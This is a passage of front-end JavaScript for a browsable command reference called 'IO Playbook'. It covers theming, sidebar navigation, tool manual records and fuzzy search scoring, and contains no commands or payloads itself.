            font-size: 0.78rem;
        }

        .tool-actions .doc-pill:hover,
        .tool-actions .install-pill:hover,
        .manual-hero-actions .install-pill:hover,
        .manual-hero-actions .doc-pill:hover {
            transform: translateY(-1px);
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.1),
                0 18px 36px -26px var(--shadow);
        }

        .install-method {
            padding-top: 4px;
            border-top: 1px solid var(--line);
        }

        .install-command-stack {
            display: grid;
            gap: 10px;
        }

        @media (max-width: 1180px) {
            .manual-hero-actions {
                align-items: flex-start;
            }
        }
    `;
    document.head.appendChild(style);
}

function applyTheme(index) {
    const mode = modes[index] || modes[0];
    document.body.dataset.mode = mode.id;
    themeBtn.innerHTML = `<span class="material-symbols-outlined">${mode.id === "light" ? "light_mode" : "dark_mode"}</span>`;
    themeBtn.setAttribute("aria-label", `Theme: ${mode.name}. Click to switch theme.`);
    themeBtn.setAttribute("title", `Theme: ${mode.name}`);
}

function cycleTheme() {
    currentModeIndex = (currentModeIndex + 1) % modes.length;
    localStorage.setItem("io_mode", modes[currentModeIndex].id);
    applyTheme(currentModeIndex);
}

function syncSidebarToggleIcon() {
    const icon = sidebarToggleBtn.querySelector(".material-symbols-outlined");
    if (icon) {
        icon.textContent = isSidebarCollapsed ? "menu" : "menu_open";
    }
    sidebarToggleBtn.setAttribute("aria-expanded", String(!isSidebarCollapsed));
}

function applySidebarState() {
    sidebar.classList.toggle("collapsed", isSidebarCollapsed);
    appContainer.classList.toggle("sidebar-collapsed", isSidebarCollapsed);
    syncSidebarToggleIcon();
}

function toggleSidebar() {
    isSidebarCollapsed = !isSidebarCollapsed;
    localStorage.setItem("io_sidebar_collapsed", isSidebarCollapsed ? "1" : "0");
    applySidebarState();
}

function getModuleKey(pathName, moduleName) {
    return `${pathName}::${moduleName}`;
}

function hasActiveToolPanel() {
    return Boolean(activeToolContext.tool);
}

function getNavigationFocus() {
    if (hasActiveToolPanel()) {
        return activeToolContext;
    }

    return activeView;
}

function updateWorkspaceLayout() {
    const isDetailOpen = hasActiveToolPanel();
    workspaceShell.classList.toggle("has-detail", isDetailOpen);
    detailPanel.hidden = !isDetailOpen;
    detailCaption.textContent = isDetailOpen
        ? `${activeToolContext.tool} manual pinned here while you keep browsing on the left.`
        : defaultDetailCaption;
}

function isActiveToolLocation(pathName, moduleName, toolName) {
    return hasActiveToolPanel()
        && activeToolContext.path === pathName
        && activeToolContext.module === moduleName
        && activeToolContext.tool === toolName;
}

function ensureSidebarHasOpenPath() {
    if (hasInitializedSidebarState) {
        return;
    }

    if (expandedSidebarPaths.size > 0) {
        hasInitializedSidebarState = true;
        return;
    }

    const firstPath = getOrderedPaths()[0];
    if (firstPath) {
        expandedSidebarPaths.add(firstPath);
    }
    hasInitializedSidebarState = true;
}

function togglePathExpansion(pathName) {
    if (expandedSidebarPaths.has(pathName)) {
        expandedSidebarPaths.delete(pathName);
        Array.from(expandedSidebarModules).forEach(moduleKey => {
            if (moduleKey.startsWith(`${pathName}::`)) {
                expandedSidebarModules.delete(moduleKey);
            }
        });
    } else {
        expandedSidebarPaths.add(pathName);
    }

    renderSidebar();
}

function toggleModuleExpansion(pathName, moduleName) {
    const key = getModuleKey(pathName, moduleName);
    expandedSidebarPaths.add(pathName);

    if (expandedSidebarModules.has(key)) {
        expandedSidebarModules.delete(key);
    } else {
        expandedSidebarModules.add(key);
    }

    renderSidebar();
}

function expandSidebarTo(pathName, moduleName = null) {
    if (pathName) {
        expandedSidebarPaths.add(pathName);
    }

    if (pathName && moduleName) {
        expandedSidebarModules.add(getModuleKey(pathName, moduleName));
    }
}

function escapeHtml(input = "") {
    return String(input)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#39;");
}

function normalizeText(value) {
    return String(value || "")
        .toLowerCase()
        .replace(/[^\w\s./:-]/g, " ")
        .replace(/\s+/g, " ")
        .trim();
}

function tokenizeNormalizedText(value) {
    return normalizeText(value).split(/\s+/).filter(Boolean);
}

function addSearchTermVariants(set, rawTerm) {
    const term = String(rawTerm || "").trim().toLowerCase();

    if (!term) {
        return;
    }

    [
        term,
        term.replace(/^[./:-]+|[./:-]+$/g, ""),
        term.replace(/\.(py|exe|ps1|bat|cmd|sh|rb|pl)$/g, ""),
        term.replace(/[^a-z0-9]/g, "")
    ]
        .filter(Boolean)
        .forEach(candidate => {
            set.add(candidate);

            if (/[./:-]/.test(candidate)) {
                candidate.split(/[./:-]/).filter(Boolean).forEach(part => set.add(part));
            }
        });
}

function buildSearchTerms(values = []) {
    const sourceValues = Array.isArray(values) ? values : [values];
    const terms = new Set();

    sourceValues.forEach(value => {
        tokenizeNormalizedText(value).forEach(token => addSearchTermVariants(terms, token));
    });

    return Array.from(terms).filter(term => term.length > 1);
}

function getTokenVariants(token) {
    const variants = new Set();
    addSearchTermVariants(variants, normalizeText(token));
    return Array.from(variants);
}

function getFuzzyDistanceBudget(tokenLength) {
    if (tokenLength >= 9) {
        return 2;
    }

    if (tokenLength >= 5) {
        return 1;
    }

    return 0;
}

function getLevenshteinDistanceWithin(a, b, maxDistance) {
    if (a === b) {
        return 0;
    }

    if (maxDistance < 1 || Math.abs(a.length - b.length) > maxDistance) {
        return Number.POSITIVE_INFINITY;
    }

    let previous = Array.from({ length: b.length + 1 }, (_, index) => index);
    let current = new Array(b.length + 1).fill(0);

    for (let row = 1; row <= a.length; row += 1) {
        current[0] = row;
        let rowMin = current[0];

        for (let column = 1; column <= b.length; column += 1) {
            const substitutionCost = a[row - 1] === b[column - 1] ? 0 : 1;
            current[column] = Math.min(
                previous[column] + 1,
                current[column - 1] + 1,
                previous[column - 1] + substitutionCost
            );
            rowMin = Math.min(rowMin, current[column]);
        }

        if (rowMin > maxDistance) {
            return Number.POSITIVE_INFINITY;
        }

        [previous, current] = [current, previous];
    }

    return previous[b.length];
}

function isLooseSubsequenceMatch(token, candidate) {
    if (token.length < 5 || candidate.length < token.length) {
        return false;
    }

    let index = 0;
    for (const character of candidate) {
        if (character === token[index]) {
            index += 1;
            if (index === token.length) {
                return true;
            }
        }
    }

    return false;
}

function getTermMatchStrength(token, searchTerms = [], allowFuzzy = false) {
    if (!token || searchTerms.length === 0) {
        return 0;
    }

    const variants = getTokenVariants(token);
    let bestStrength = 0;

    for (const searchTerm of searchTerms) {
        for (const variant of variants) {
            if (searchTerm === variant) {
                return 1;
            }

            if (searchTerm.includes(variant) || variant.includes(searchTerm)) {
                bestStrength = Math.max(bestStrength, 0.9);
                continue;
            }

            if (!allowFuzzy || variant.length < 4 || searchTerm.length < 4) {
                continue;
            }

            const maxDistance = getFuzzyDistanceBudget(Math.max(variant.length, searchTerm.length));
            const distance = getLevenshteinDistanceWithin(variant, searchTerm, maxDistance);

            if (distance === 1) {
                bestStrength = Math.max(bestStrength, 0.74);
                continue;
            }

            if (distance === 2) {
                bestStrength = Math.max(bestStrength, 0.58);
                continue;
            }

            if (isLooseSubsequenceMatch(variant, searchTerm)) {
                bestStrength = Math.max(bestStrength, 0.5);
            }
        }
    }

    return bestStrength;
}

function isWorkflowEntry(item = {}) {
    return normalizeText(item.type) === "workflow";
}

function hasCopyableCommand(item = {}) {
    return Boolean(String(item.command || "").trim()) && !isWorkflowEntry(item);
}

function isCommandEntry(item = {}) {
    return normalizeText(item.type) === "command";
}

function pluralize(count, singular, pluralForm = `${singular}s`) {
    if (pluralForm === `${singular}s`) {
        if (singular.endsWith("y")) {
            pluralForm = `${singular.slice(0, -1)}ies`;
        } else if (/(s|x|z|ch|sh)$/i.test(singular)) {
            pluralForm = `${singular}es`;
        }
    }
    return `${count} ${count === 1 ? singular : pluralForm}`;
}

function buildTagMarkup(tags = [], limit = tags.length) {
    return tags
        .slice(0, limit)
        .map(tag => `<span class="tag-chip">${escapeHtml(tag)}</span>`)
        .join("");
}

function buildPreviewText(value = "") {
    return escapeHtml(String(value).replace(/\s+/g, " ").trim());
}

function extractFlags(item) {
    const command = String(item.command || "");
    const flags = [];
    const unixMatches = command.match(/(?:^|\s)(--?[A-Za-z0-9][\w-]*)/g) || [];

    unixMatches.forEach(match => {
        flags.push(match.trim());
    });

    if (String(item.platform || "").toLowerCase().includes("windows")) {
        const windowsMatches = command.match(/(?:^|\s)(\/[A-Za-z][A-Za-z0-9-]*)/g) || [];
        windowsMatches.forEach(match => {
            flags.push(match.trim());
        });
    }

    return Array.from(new Set(flags));
}

function extractPlaceholders(command = "") {
    const placeholders = (String(command).match(/<[^>]+>/g) || [])
        .map(placeholder => placeholder.trim())
        .filter(placeholder => /^<[A-Z0-9_]+>$/.test(placeholder));
    const normalized = [...placeholders];

    if (/(?:request|raw)\.txt/i.test(String(command))) {
        normalized.push("<REQUEST_FILE>");
    }

    return Array.from(new Set(normalized));
}

function getUniqueValues(values = []) {
    return Array.from(new Set(values.filter(Boolean)));
}

function hydrateMeta(meta = {}) {
    appMeta = meta;
    pathMetaByName = new Map((meta.paths || []).map(path => [path.name, path]));
    moduleMetaByName = new Map((meta.modules || []).map(module => [module.name, module]));
    toolProfileByName = new Map((meta.tool_profiles || []).map(profile => [profile.name, profile]));
}

function hydrateToolManualOverrides(manualData = {}) {
    toolManualOverrideByName = new Map((manualData.tools || []).map(tool => [tool.name, tool]));
}

function getToolProfile(toolName) {
    return toolProfileByName.get(toolName) || {};
}

function getToolManualOverride(toolName) {
    return toolManualOverrideByName.get(toolName) || {};
}

function getToolInstallationOverride(toolName, override = {}) {
    return override.installation || toolInstallationCatalog.get(toolName) || null;
}

function getToolInstallationSearchText(installation = null) {
    if (!installation) {
        return [];
    }

    return [
        installation.status,
        installation.baseline,
        installation.summary,
        ...(installation.methods || []).flatMap(method => [
            method.label,
            method.description,
            ...(method.commands || []),
            ...(method.notes || []),
            method.source_label
        ]),
        ...(installation.sources || []).flatMap(source => [source.label, source.url])
    ];
}

function mergeReferenceItems(primary = [], secondary = []) {
    const seen = new Set();
    const output = [];

    [...primary, ...secondary].forEach(item => {
        const name = item?.name;
        if (!name || seen.has(name)) {
            return;
        }

        seen.add(name);
        output.push(item);
    });

    return output;
}

function buildDerivedToolSummary(toolName, items, override = {}) {
    if (override.summary) {
        return override.summary;
    }

    if (items.length === 0) {
        return `${toolName} quick guide.`;
    }

    const useCases = getToolUseCases(items, 3);
    const firstDescription = items.find(item => item.description)?.description;

    if (firstDescription && useCases.length > 1) {
        return `${firstDescription} Saved here for ${useCases.join(", ")}.`;
    }

    if (firstDescription) {
        return firstDescription;
    }

    const workflows = getUniqueValues(items.map(item => item.module));
    if (workflows.length > 0) {
        return `Used in ${workflows.slice(0, 3).join(", ")} workflows across this playbook.`;
    }

    return `${toolName} quick guide.`;
}

function buildDerivedToolSyntax(items, override = {}) {
    const firstCommandItem = items.find(item => isCommandEntry(item) && Boolean(String(item.command || "").trim()));
    if (!firstCommandItem) {
        return "";
    }

    if (override.syntax) {
        return override.syntax;
    }

    const firstCommand = normalizeText(firstCommandItem.command || "") ? String(firstCommandItem.command).trim() : "";
    if (!firstCommand) {
        return "";
    }

    return firstCommand.length > 110 ? `${firstCommand.slice(0, 107)}...` : firstCommand;
}

function buildToolParameters(items, override = {}) {
    const manualParameters = override.parameters || [];
    const seen = new Set();
    const output = [];
    const parameterSourceItems = items.filter(item => hasCopyableCommand(item));

    manualParameters.forEach(parameter => {
        if (!parameter?.name || seen.has(parameter.name)) {
            return;
        }
        seen.add(parameter.name);
        output.push(parameter);
    });

    getUniqueValues(parameterSourceItems.flatMap(item => extractPlaceholders(item.command))).forEach(parameterName => {
        if (seen.has(parameterName)) {
            return;
        }

        seen.add(parameterName);
        output.push({
            name: parameterName,
            description: placeholderDescriptions[parameterName] || "Placeholder used in the saved commands for this tool."
        });
    });

    return output.slice(0, 8);
}

function buildDerivedReferenceItems(items, override = {}) {
    return (override.reference_items || []).slice(0, 24);
}

function buildToolNotes(items, override = {}) {
    if ((override.notes || []).length > 0) {
        return override.notes;
    }

    const notes = getUniqueValues(items.map(item => item.tip).filter(Boolean));
    return notes.slice(0, 2);
}

function buildRelatedTools(toolName, items, override = {}) {
    const manualRelated = override.related_tools || [];
    const relatedCounts = new Map();

    items.forEach(item => {
        db
            .filter(entry => entry.tool !== toolName && entry.path === item.path && entry.module === item.module)
            .forEach(entry => {
                relatedCounts.set(entry.tool, (relatedCounts.get(entry.tool) || 0) + 1);
            });
    });

    const derived = Array.from(relatedCounts.entries())
        .sort((a, b) => {
            if (b[1] !== a[1]) {
                return b[1] - a[1];
            }
            return a[0].localeCompare(b[0]);
        })
        .map(([tool]) => tool);

    return getUniqueValues([...manualRelated, ...derived]).slice(0, 6);
}

function buildToolManualRecord(toolName, items) {
    const override = getToolManualOverride(toolName);
    const profile = getToolProfile(toolName);
    const workflows = getUniqueValues(items.map(item => `${item.path} • ${item.module}`));
    const stages = getUniqueValues(items.map(item => item.path));
    const platforms = getPlatforms(items);
    const parameters = buildToolParameters(items, override);
    const referenceItems = buildDerivedReferenceItems(items, override);
    const notes = buildToolNotes(items, override);
    const relatedTools = buildRelatedTools(toolName, items, override);
    const syntax = buildDerivedToolSyntax(items, override);
    const summary = buildDerivedToolSummary(toolName, items, override);
    const installation = getToolInstallationOverride(toolName, override);

    const searchText = normalizeText([
        toolName,
        summary,
        syntax,
        ...stages,
        ...workflows,
        ...platforms,
        ...items.flatMap(item => [item.title, item.description, item.command, item.tip]),
        ...parameters.flatMap(parameter => [parameter.name, parameter.description]),
        ...referenceItems.flatMap(item => [item.name, item.type, item.description, item.use_case]),
        ...getUniqueValues(items.flatMap(item => item.flags || [])),
        ...(notes || []),
        ...(relatedTools || []),
        ...getToolInstallationSearchText(installation)
    ].join(" "));

    return {
        name: toolName,
        summary,
        syntax,
        parameters,
        reference_items: referenceItems,
        notes,
        related_tools: relatedTools,
        installation,
        workflows,
        stages,
        platforms,
        items: sortItemsForView(items),
        manual_label: profile.manual_label || override.manual_label || "",
        manual_url: profile.manual_url || override.manual_url || "",
        _searchText: searchText,
        _searchTerms: buildSearchTerms(searchText),
        _nameTerms: buildSearchTerms(toolName),
        _summaryTerms: buildSearchTerms(summary)
    };
}

function buildToolManualIndex() {
    toolManualByName = new Map();

    getUniqueValues(db.map(item => item.tool)).forEach(toolName => {
        const items = db.filter(item => item.tool === toolName);
        toolManualByName.set(toolName, buildToolManualRecord(toolName, items));
    });
}

function getToolManual(toolName) {
    return toolManualByName.get(toolName) || buildToolManualRecord(toolName, []);
}

function buildSearchText(item, moduleMeta = {}) {
    const toolProfile = getToolProfile(item.tool);
    return normalizeText([
        item.path,
        item.module,
        item.tool,
        item.type,
        item.platform,
        item.title,
        item.description,
        item.command,
        item.tip,
        item.help_menu,
        toolProfile.manual_label,
        moduleMeta.summary,
        ...(moduleMeta.tools || []),
        ...(item.tags || [])
    ].join(" "));
}

function annotateEntries(entries) {
    return entries.map((entry, index) => {
        const moduleMeta = moduleMetaByName.get(entry.module) || {};
        const toolProfile = getToolProfile(entry.tool);
        const item = { ...entry };
        item.type = item.type || "Command";
        if (!item.reference_url && toolProfile.manual_url) {
            item.reference_url = toolProfile.manual_url;
            item.reference_label = toolProfile.manual_label || "Manual";
        }
        item.entryId = `entry-${index}`;
        item.flags = extractFlags(item);
        item._searchPath = normalizeText(item.path);
        item._searchModule = normalizeText(item.module);
        item._searchTool = normalizeText(item.tool);
        item._searchType = normalizeText(item.type);
        item._searchPlatform = normalizeText(item.platform);
        item._searchTitle = normalizeText(item.title);
        item._searchDescription = normalizeText(item.description);
        item._searchCommand = normalizeText(item.command);
        item._searchTip = normalizeText(item.tip);
        item._searchModuleSummary = normalizeText(moduleMeta.summary || "");
        item._normalizedTags = (item.tags || []).map(normalizeText);
        item._searchText = buildSearchText(item, moduleMeta);
        item._pathTerms = buildSearchTerms(item.path);
        item._moduleTerms = buildSearchTerms(item.module);
        item._toolTerms = buildSearchTerms(item.tool);
        item._titleTerms = buildSearchTerms(item.title);
        item._descriptionTerms = buildSearchTerms(item.description);
        item._commandTerms = buildSearchTerms(item.command);
        item._moduleSummaryTerms = buildSearchTerms(moduleMeta.summary || "");
        item._tagTerms = buildSearchTerms(item.tags || []);
        item._searchTerms = buildSearchTerms(item._searchText);
        item._score = 0;
        return item;
    });
}

function getPathMeta(pathName) {
    return pathMetaByName.get(pathName) || {};
}

function getModuleMeta(moduleName) {
    return moduleMetaByName.get(moduleName) || {};
}

function getOrderedPaths(paths = Object.keys(navTree)) {
    const preferred = appMeta.path_order || [];
    const preferredSet = new Set(preferred);
    const ordered = preferred.filter(path => paths.includes(path));
    const extras = paths.filter(path => !preferredSet.has(path)).sort((a, b) => a.localeCompare(b));
    return [...ordered, ...extras];
}

function getOrderedModules(pathName, modules = []) {
    const preferred = (appMeta.module_order || []).filter(moduleName => {
        return modules.includes(moduleName) && (getModuleMeta(moduleName).path || pathName) === pathName;
    });
    const preferredSet = new Set(preferred);
    const extras = modules.filter(moduleName => !preferredSet.has(moduleName)).sort((a, b) => a.localeCompare(b));
    return [...preferred, ...extras];
}

function getPathRank(pathName) {
    const orderedPaths = getOrderedPaths();
    const rank = orderedPaths.indexOf(pathName);
    return rank === -1 ? orderedPaths.length + 1 : rank;
}

function getModuleRank(moduleName) {
    const orderedModules = appMeta.module_order || [];
    const rank = orderedModules.indexOf(moduleName);
    return rank === -1 ? orderedModules.length + 1 : rank;
}

function buildNavTree() {
    navTree = {};

    db.forEach(item => {
        if (!navTree[item.path]) {
            navTree[item.path] = {
                count: 0,
                modules: {}
            };
        }

        navTree[item.path].count += 1;

        if (!navTree[item.path].modules[item.module]) {
            navTree[item.path].modules[item.module] = {
                count: 0,
                tools: {}
            };
        }

        navTree[item.path].modules[item.module].count += 1;
        navTree[item.path].modules[item.module].tools[item.tool] = (navTree[item.path].modules[item.module].tools[item.tool] || 0) + 1;
    });
}

function renderSidebar() {
    categoryListDiv.innerHTML = "";
    ensureSidebarHasOpenPath();
    const navigationFocus = getNavigationFocus();

    getOrderedPaths().forEach(pathName => {
        const pathGroup = navTree[pathName] || { count: 0, modules: {} };
        const modules = Object.keys(pathGroup.modules || {});
        const isPathSelected = navigationFocus.path === pathName;
        const isPathActive = activeView.type === "path" && activeView.path === pathName;
        const isPathOpen = expandedSidebarPaths.has(pathName);

        const navPath = document.createElement("section");
        navPath.className = "nav-path";

        const pathHeader = document.createElement("button");
        pathHeader.type = "button";
        pathHeader.className = "path-header";
        if (isPathSelected) {
            pathHeader.classList.add("active");
        }
        if (isPathOpen) {
            pathHeader.classList.add("open");
        }
        pathHeader.innerHTML = `
            <span class="path-label-wrap">
                <span class="path-arrow material-symbols-outlined">expand_more</span>
                <span class="path-label">${escapeHtml(pathName)}</span>
            </span>
            <span class="path-count">${modules.length}</span>
        `;
        pathHeader.onclick = () => {
            if (isPathActive) {
                togglePathExpansion(pathName);
                return;
            }

            expandedSidebarPaths.add(pathName);
            loadView(pathName, null, null, "", { historyMode: "push" });
        };

        const moduleList = document.createElement("div");
        moduleList.className = "module-list";
        if (isPathOpen) {
            moduleList.classList.add("open");
        }

        getOrderedModules(pathName, modules).forEach(moduleName => {
            const moduleData = pathGroup.modules[moduleName];
            const meta = getModuleMeta(moduleName);
            const tools = Object.keys(moduleData.tools || {}).sort((a, b) => a.localeCompare(b));
            const isModuleSelected = navigationFocus.path === pathName && navigationFocus.module === moduleName;
            const isModuleActive = activeView.type === "module" && activeView.path === pathName && activeView.module === moduleName;
            const moduleKey = getModuleKey(pathName, moduleName);
            const isModuleOpen = expandedSidebarModules.has(moduleKey);

            const moduleNode = document.createElement("div");
            moduleNode.className = "module-tree-node";

            const moduleButton = document.createElement("button");
            moduleButton.type = "button";
            moduleButton.className = "module-item";
            if (isModuleSelected) {
                moduleButton.classList.add("active");
            }
            if (isModuleOpen) {
                moduleButton.classList.add("open");
            }
            moduleButton.title = moduleName;
            moduleButton.innerHTML = `
                <span class="module-item-main">
                    <span class="module-item-topline">
                        <span class="module-arrow material-symbols-outlined">expand_more</span>
                        <span class="module-item-title">${escapeHtml(moduleName)}</span>
                    </span>
                </span>
                <span class="module-count">${tools.length}</span>
            `;
            moduleButton.onclick = () => {
                if (isModuleActive) {
                    toggleModuleExpansion(pathName, moduleName);
                    return;
                }

                expandSidebarTo(pathName, moduleName);
                loadView(pathName, moduleName, null, "", { historyMode: "push" });
            };

            const toolList = document.createElement("div");
            toolList.className = "tool-list";
            if (isModuleOpen) {
                toolList.classList.add("open");
            }

            tools.forEach(toolName => {
                const toolItem = document.createElement("button");
                toolItem.type = "button";
                toolItem.className = "tool-item";
                if (isActiveToolLocation(pathName, moduleName, toolName)) {
                    toolItem.classList.add("active");
                }
                toolItem.title = toolName;
                toolItem.innerHTML = `
                    <span>${escapeHtml(toolName)}</span>
                    ${moduleData.tools[toolName] > 1 ? `<span class="tool-count">${moduleData.tools[toolName]}</span>` : ""}
                `;
                toolItem.onclick = () => {
                    expandSidebarTo(pathName, moduleName);
                    loadToolView(toolName, pathName, moduleName);
                };
                toolList.appendChild(toolItem);
            });

            moduleNode.appendChild(moduleButton);
            moduleNode.appendChild(toolList);
            moduleList.appendChild(moduleNode);
        });

        navPath.appendChild(pathHeader);
        navPath.appendChild(moduleList);
        categoryListDiv.appendChild(navPath);
    });
}

function getPopularTools(limit = 8) {
    return Array.from(toolManualByName.values())
        .filter(manual => (manual.items || []).length > 0)
        .sort((a, b) => {
            if (b.items.length !== a.items.length) {
                return b.items.length - a.items.length;
            }
            if (b.workflows.length !== a.workflows.length) {
                return b.workflows.length - a.workflows.length;
            }
            return a.name.localeCompare(b.name);
        })
        .slice(0, limit);
}

function renderSidebarMetrics() {
    if (!sidebarMetrics) {
        return;
    }

    const toolCount = new Set(db.map(item => item.tool)).size;
    sidebarMetrics.innerHTML = `
        <div class="sidebar-metric-card">
            <span class="sidebar-metric-label">Inventory</span>
            <div class="sidebar-metric-row">
                <span class="sidebar-metric-value">${toolCount}</span>
                <span class="sidebar-metric-copy">tools indexed</span>
            </div>
        </div>
    `;
}

function renderHomeDashboard() {
    heroTitle.textContent = appMeta.title || "IO Playbook";
    heroSubtitle.textContent = appMeta.subtitle || "";
    heroDisclaimer.textContent = appMeta.disclaimer || "";

    const popularTools = getPopularTools();
    renderSidebarMetrics();
    if (popularToolsMeta) {
        popularToolsMeta.textContent = `Top ${popularTools.length}`;
    }

    if (popularToolsGrid) {
        popularToolsGrid.innerHTML = "";
        popularTools.forEach(toolManual => {
            const button = document.createElement("button");
            button.type = "button";
            button.className = "popular-tool-btn";
            button.innerHTML = `
                <span class="popular-tool-head">
                    <span class="tool-pill">${escapeHtml(toolManual.name)}</span>
                    <span class="popular-tool-count">${pluralize(toolManual.items.length, "entry")}</span>
                </span>
                <span class="popular-tool-summary">${escapeHtml(toolManual.summary || `${toolManual.name} manual.`)}</span>
                <span class="popular-tool-meta">${escapeHtml(`${pluralize(toolManual.workflows.length, "workflow")} • ${(toolManual.platforms || []).slice(0, 2).join(" • ") || "Mixed use"}`)}</span>
            `;
            button.onclick = () => {
                loadToolView(toolManual.name);
            };
            popularToolsGrid.appendChild(button);
        });
    }

    shortcutGrid.innerHTML = "";
    (appMeta.quickstart || []).forEach(shortcut => {
        const button = document.createElement("button");
        button.type = "button";
        button.className = "shortcut-btn";
        button.innerHTML = `
            <span class="shortcut-label">${escapeHtml(shortcut.label)}</span>
            <span class="shortcut-query">${escapeHtml(shortcut.module || shortcut.query || "")}</span>
        `;
        button.onclick = () => {
            if (shortcut.module) {
                const moduleMeta = getModuleMeta(shortcut.module);
                loadView(moduleMeta.path || null, shortcut.module, null, "", { historyMode: "push" });
                return;
            }
            executeSearch(shortcut.query || "");
        };
        shortcutGrid.appendChild(button);
    });

    principlesList.innerHTML = (appMeta.principles || [])
        .map(principle => `<li>${escapeHtml(principle)}</li>`)
        .join("");
}

function setResultsMeta(text) {
    resultsMeta.textContent = text;
}

function setClearSearchState(active = activeView.type !== "home" || hasActiveToolPanel()) {
    clearSearchBtn.disabled = !active;
}

function renderEmptyState(message) {
    payloadContainer.innerHTML = `
        <div class="empty-state">
            <h3>No matching playbook entries</h3>
            <p>${escapeHtml(message)}</p>
        </div>
    `;
}

function scoreSearchMatch(item, normalizedQuery, tokens, requireAllTokens = true, allowFuzzy = false) {
    const tokenMatches = tokens.map(token => ({
        command: getTermMatchStrength(token, item._commandTerms, allowFuzzy),
        title: getTermMatchStrength(token, item._titleTerms, allowFuzzy),
        module: getTermMatchStrength(token, item._moduleTerms, allowFuzzy),
        tool: getTermMatchStrength(token, item._toolTerms, allowFuzzy),
        path: getTermMatchStrength(token, item._pathTerms, allowFuzzy),
        summary: getTermMatchStrength(token, item._moduleSummaryTerms, allowFuzzy),
        description: getTermMatchStrength(token, item._descriptionTerms, allowFuzzy),
        tags: getTermMatchStrength(token, item._tagTerms, allowFuzzy)
    }));
    const matchingTokens = tokenMatches.filter(match => Math.max(...Object.values(match)) > 0);

    if (requireAllTokens && matchingTokens.length !== tokens.length) {
        return -1;
    }

    if (!requireAllTokens && matchingTokens.length === 0) {
        return -1;
    }

    let score = matchingTokens.length * 12;

    if (item._searchCommand === normalizedQuery) {
        score += 220;
    }

    if (item._searchTitle === normalizedQuery) {
        score += 170;
    }

    if (item._searchModule === normalizedQuery) {
        score += 150;
    }

    if (item._searchTool === normalizedQuery) {
        score += 135;
    }

    if (item._searchPath === normalizedQuery) {
        score += 120;
    }

    if (normalizedQuery && item._searchCommand.includes(normalizedQuery)) {
        score += 145;
    }

    if (normalizedQuery && item._searchTitle.includes(normalizedQuery)) {
        score += 120;
    }

    if (normalizedQuery && item._searchModule.includes(normalizedQuery)) {
        score += 110;
    }

    if (normalizedQuery && item._searchTool.includes(normalizedQuery)) {
        score += 95;
    }

    if (normalizedQuery && item._searchPath.includes(normalizedQuery)) {
        score += 65;
    }

    if (normalizedQuery && item._searchModuleSummary.includes(normalizedQuery)) {
        score += 30;
    }

    matchingTokens.forEach(match => {
        score += match.command * 22;
        score += match.title * 18;
        score += match.module * 16;
        score += match.tool * 14;
        score += match.path * 11;
        score += match.summary * 10;
        score += match.description * 8;
        score += match.tags * 10;
    });

    return score;
}

function getSearchResults(query) {
    const normalizedQuery = normalizeText(query);
    const tokens = normalizedQuery.split(/\s+/).filter(Boolean);

    if (tokens.length === 0) {
        return {
            items: [],
            broad: false
        };
    }

    const buildMatches = requireAllTokens => {
        return db
            .map(item => {
                const score = scoreSearchMatch(item, normalizedQuery, tokens, requireAllTokens, false);
                if (score < 0) {
                    return null;
                }
                item._score = score;
                return item;
            })
            .filter(Boolean)
            .sort((a, b) => {
                if (b._score !== a._score) {
                    return b._score - a._score;
                }
                return a.title.localeCompare(b.title);
            });
    };

    const strictMatches = buildMatches(true);
    if (strictMatches.length > 0) {
        return {
            items: strictMatches,
            broad: false,
            fuzzy: false
        };
    }

    const fuzzyStrictMatches = db
        .map(item => {
            const score = scoreSearchMatch(item, normalizedQuery, tokens, true, true);
            if (score < 0) {
                return null;
            }
            item._score = score;
            return item;
        })
        .filter(Boolean)
        .sort((a, b) => {
            if (b._score !== a._score) {
                return b._score - a._score;
            }
            return a.title.localeCompare(b.title);
        });

    if (fuzzyStrictMatches.length > 0) {
        return {
            items: fuzzyStrictMatches,
            broad: false,
            fuzzy: true
        };
    }

    return {
        items: db
            .map(item => {
                const score = scoreSearchMatch(item, normalizedQuery, tokens, false, true);
                if (score < 0) {
                    return null;
                }
                item._score = score;
                return item;
            })
            .filter(Boolean)
            .sort((a, b) => {
                if (b._score !== a._score) {
                    return b._score - a._score;
                }
                return a.title.localeCompare(b.title);
            }),
        broad: true,
        fuzzy: true
    };
}

function scoreToolMatch(toolManual, normalizedQuery, tokens, requireAllTokens = true, allowFuzzy = false) {
    const tokenMatches = tokens.map(token => ({
        name: getTermMatchStrength(token, toolManual._nameTerms || [], allowFuzzy),
        summary: getTermMatchStrength(token, toolManual._summaryTerms || [], allowFuzzy),
        any: getTermMatchStrength(token, toolManual._searchTerms || [], allowFuzzy)
    }));
    const matchingTokens = tokenMatches.filter(match => Math.max(...Object.values(match)) > 0);

    if (requireAllTokens && matchingTokens.length !== tokens.length) {
        return -1;
    }

    if (!requireAllTokens && matchingTokens.length === 0) {
        return -1;
    }

    const normalizedName = normalizeText(toolManual.name);
    let score = matchingTokens.length * 14;

    if (normalizedName === normalizedQuery) {
        score += 280;
    }

    if (normalizedQuery && normalizedName.includes(normalizedQuery)) {
        score += 160;
    }

    matchingTokens.forEach(match => {
        score += match.name * 28;
        score += match.summary * 12;
        score += match.any * 8;
    });

    score += (toolManual.reference_items || []).length;

    return score;
}

function getToolSearchResults(query) {
    const normalizedQuery = normalizeText(query);
    const tokens = normalizedQuery.split(/\s+/).filter(Boolean);

    if (tokens.length === 0) {
        return {
            items: [],
            broad: false
        };
    }

    const manuals = Array.from(toolManualByName.values());
    const buildMatches = requireAllTokens => {
        return manuals
            .map(toolManual => {
                const score = scoreToolMatch(toolManual, normalizedQuery, tokens, requireAllTokens, false);
                if (score < 0) {
                    return null;
                }
                return {
                    ...toolManual,
                    _score: score
                };
            })
            .filter(Boolean)
            .sort((a, b) => {
                if (b._score !== a._score) {
                    return b._score - a._score;
                }
                return a.name.localeCompare(b.name);
            });
    };

    const strictMatches = buildMatches(true);
    if (strictMatches.length > 0) {
        return {
            items: strictMatches,
            broad: false,
            fuzzy: false
        };
    }

    const fuzzyStrictMatches = manuals
        .map(toolManual => {
            const score = scoreToolMatch(toolManual, normalizedQuery, tokens, true, true);
            if (score < 0) {
                return null;
            }
            return {
                ...toolManual,
                _score: score
            };
        })
        .filter(Boolean)
        .sort((a, b) => {
            if (b._score !== a._score) {
                return b._score - a._score;
            }
            return a.name.localeCompare(b.name);
        });

